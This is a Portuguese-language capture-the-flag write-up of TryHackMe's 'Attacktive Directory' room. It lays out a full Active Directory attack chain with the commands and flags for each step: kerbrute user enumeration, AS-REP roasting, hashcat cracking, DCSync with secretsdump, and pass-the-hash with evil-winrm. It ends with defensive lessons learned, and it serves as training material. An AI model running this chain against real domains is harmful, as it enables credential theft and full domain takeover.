# Attacktive Directory (TryHackMe)

Write-up de um CTF de Active Directory, focado na cadeia completa de ataque: enumeração sem credenciais, abuso do Kerberos para obter credenciais, e uso dessas credenciais para subir até controle total do domínio.

**Plataforma:** TryHackMe
**Técnicas:** Enumeração SMB, Kerberos (AS-REP Roasting), Password Cracking, DCSync, Pass-the-Hash

## Cadeia de ataque

```
Nmap → enum4linux → kerbrute → AS-REP Roasting → hashcat
→ smbclient → base64 decode → DCSync (secretsdump) → Pass-the-Hash (evil-winrm)
```

---

## 1. Enumeração inicial

**Camada OSI:** 3 e 4 (Rede e Transporte)

```bash
nmap -sC -sV -oN scan.txt <IP>
```

- `-sC` — roda os scripts padrão do Nmap
- `-sV` — detecta a versão dos serviços
- `-oN scan.txt` — salva o resultado em arquivo legível

Portas relevantes: `139/445` (SMB), `88` (Kerberos), `3389` (RDP), `5985` (WinRM). A combinação dessas portas já indica um Domain Controller Windows.

### enum4linux — enumeração SMB

**Camada OSI:** 7 (Aplicação) — protocolo SMB

```bash
enum4linux -a <IP>
```

- `-a` — enumeração completa

Mesmo sem permissão para sessão nula completa (vários `ACCESS_DENIED`), a ferramenta trouxe o nome e o SID do domínio, e enumerou alguns usuários via **RID cycling** — uma técnica que testa IDs sequenciais de conta mesmo sem acesso direto de listagem.

---

## 2. Enumeração de usuários — Kerbrute

**Camada OSI:** 7 (Aplicação) — protocolo Kerberos (porta 88)

```bash
kerbrute userenum --dc <IP> -d <dominio> userlist.txt
```

- `userenum` — subcomando para enumerar usuários válidos
- `--dc` — IP do Domain Controller
- `-d` — nome do domínio
- `userlist.txt` — wordlist de nomes a testar

O Kerbrute manda requisições `AS-REQ` ao Kerberos: se o usuário não existe, o DC responde com um erro específico; se existe, responde diferente, sem gerar log de falha de autenticação. Isso permite confirmar usuários válidos sem deixar rastro de tentativa de login.

Entre os usuários confirmados estava uma **conta de serviço**, do tipo que frequentemente carrega senhas fracas ou antigas.

---

## 3. AS-REP Roasting

**Camada OSI:** 7 (Aplicação) — protocolo Kerberos

**Conceito:** contas com a flag "Does not require Pre-Authentication" entregam um ticket Kerberos sem exigir confirmação de senha. Esse ticket vem criptografado com o hash da senha do usuário, e pode ser baixado para quebra offline.

```bash
impacket-GetNPUsers <dominio>/ -usersfile userlist.txt -no-pass -dc-ip <IP> 2>/dev/null
```

- `-usersfile` — lista de usuários a testar
- `-no-pass` — não tenta senha, só solicita o ticket
- `-dc-ip` — IP do Domain Controller

A conta de serviço encontrada no passo anterior não exigia pré-autenticação, e o comando retornou um hash do tipo `Kerberos 5, etype 23, AS-REP`.

---

## 4. Quebra do hash — Hashcat

```bash
hashcat -m 18200 hash.txt passwordlist.txt --force
```

- `-m 18200` — modo específico para hash Kerberos 5, etype 23, AS-REP
- `--force` — ignora avisos de compatibilidade (necessário em VM sem GPU dedicada)

A senha foi encontrada bem cedo na wordlist, confirmando que era uma senha fraca e previsível — típico de contas de serviço mal gerenciadas.

---

## 5. Enumeração SMB autenticada — smbclient

**Camada OSI:** 7 (Aplicação) — protocolo SMB

Com credenciais válidas, o acesso ao SMB fica muito mais amplo do que com sessão nula.

```bash
smbclient -L \\\\<IP>\\ -U usuario%senha
smbclient \\\\<IP>\\<share> -U usuario%senha
```

- `-L` — lista os compartilhamentos disponíveis
- `-U usuario%senha` — credenciais no formato usuário%senha

Dentro de um dos compartilhamentos havia um arquivo de credenciais com conteúdo em Base64:

```bash
echo <string_base64> | base64 -d
```

- `-d` — modo decode

O resultado revelou usuário e senha de uma **segunda conta**, com privilégios mais amplos no domínio.

---

## 6. DCSync — secretsdump

**Camada OSI:** 7 (Aplicação) — protocolo DRSUAPI

**Conceito:** essa segunda conta tinha as permissões `Replicating Directory Changes` e `Replicating Directory Changes All` — as mesmas usadas por Domain Controllers para se sincronizar entre si. Isso permite que a ferramenta `secretsdump` finja ser um DC e peça ao domínio todos os hashes de senha, via protocolo **DRSUAPI**.

Pré-requisito: adicionar o domínio ao `/etc/hosts`, já que domínios `.local` não resolvem por DNS público:

```bash
echo "<IP> <dominio>" | sudo tee -a /etc/hosts
```

```bash
impacket-secretsdump -just-dc usuario@<dominio>
```

- `-just-dc` — extrai apenas os hashes do AD via DRSUAPI

O resultado trouxe o hash NTLM do usuário **Administrator** do domínio.

---

## 7. Pass-the-Hash — Evil-WinRM

**Camada OSI:** 7 (Aplicação) — protocolo WinRM (porta 5985)

**Conceito:** o protocolo NTLM autentica com o hash da senha, não com a senha em texto puro. Com o hash do Administrator em mãos, é possível autenticar como ele sem nunca saber a senha real.

```bash
evil-winrm -i <IP> -u Administrator -H <hash_ntlm>
```

- `-i` — IP do alvo
- `-u` — usuário
- `-H` — hash NTLM, usado para Pass-the-Hash

Com isso, acesso total ao domínio como Administrator, incluindo leitura de arquivos de qualquer usuário na máquina.

---

## Conceitos-chave

- **AS-REP Roasting** — abusa de contas sem pré-autenticação Kerberos para obter hashes quebráveis offline.
- **DCSync** — abusa de permissões de replicação do AD para extrair todos os hashes do domínio sem acesso direto ao Domain Controller.
- **Pass-the-Hash** — autentica usando o hash NTLM diretamente, sem precisar da senha em texto puro.
- **DRSUAPI** — protocolo de replicação do AD usado pelo `secretsdump` para executar o DCSync.

## Ferramentas utilizadas

| Ferramenta | Função |
|---|---|
| Nmap | Enumeração de portas e serviços |
| enum4linux | Enumeração SMB |
| Kerbrute | Enumeração de usuários via Kerberos |
| Impacket (GetNPUsers, secretsdump) | AS-REP Roasting e DCSync |
| Hashcat | Quebra de hash offline |
| smbclient | Acesso a compartilhamentos SMB |
| Evil-WinRM | Shell remoto via WinRM com Pass-the-Hash |

## Lições aprendidas

- Contas de serviço sem pré-autenticação Kerberos e com senha fraca são um dos vetores mais comuns de comprometimento inicial em ambientes Active Directory.
- Credenciais "escondidas" apenas em Base64 (e não realmente criptografadas) não protegem nada contra um atacante com acesso de leitura ao arquivo.
- Permissões de replicação de diretório (`Replicating Directory Changes`) concedidas a contas que não são Domain Controllers são um risco crítico — permitem recriar um ataque DCSync completo.
